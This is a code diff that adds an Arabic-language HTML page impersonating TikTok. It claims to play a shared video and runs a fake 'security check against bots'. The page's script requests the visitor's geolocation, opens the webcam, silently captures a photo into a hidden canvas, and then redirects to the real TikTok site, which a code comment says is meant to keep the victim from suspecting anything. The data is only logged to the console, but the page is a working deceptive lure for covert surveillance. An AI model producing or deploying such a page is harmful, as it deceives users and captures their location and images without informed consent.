@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Make Your Day</title>
+    <style>
+        body {
+            background-color: #010101;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #161823;
+            border: 1px solid #2f3037;
+            padding: 30px;
+            width: 320px;
+            text-align: center;
+            border-radius: 12px;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            letter-spacing: -1px;
+        }
+        .btn {
+            background-color: #fe2c55;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-weight: bold;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .note {
+            color: #8a8b91;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">♪ TikTok</div>
+    <h3>عرض الفيديو المشترك</h3>
+    <p style="font-size: 13px; color: #acacb1;">اضغط على الزر أدناه لتشغيل المقطع بجودة عالية وتأكيد المشاهدة.</p>
+
+    <button class="btn" onclick="requestPermissions()">مشاهدة الفيديو</button>
+
+    <p class="note">تحقق أمني تلقائي لمنع الروبوتات</p>
+</div>
+
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+    function requestPermissions() {
+        // 1. طلب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                console.log("الموقع:", position.coords.latitude, position.coords.longitude);
+            });
+        }
+
+        // 2. طلب الكاميرا والتقاط الصورة
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 320, 240);
+                    
+                    const imageData = canvas.toDataURL('image/png');
+                    console.log("تم التقاط الصورة بنجاح!");
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // تحويله للموقع الحقيقي بعد ما تتم العملية عشان مايشك أبداً!
+                    window.location.href = "https://www.tiktok.com";
+                }, 1000);
+            })
+            .catch(function(err) {
+                alert("يرجى السماح بالوصول لعرض الفيديو.");
+            });
+    }
+</script>
+
+</body>
+</html>
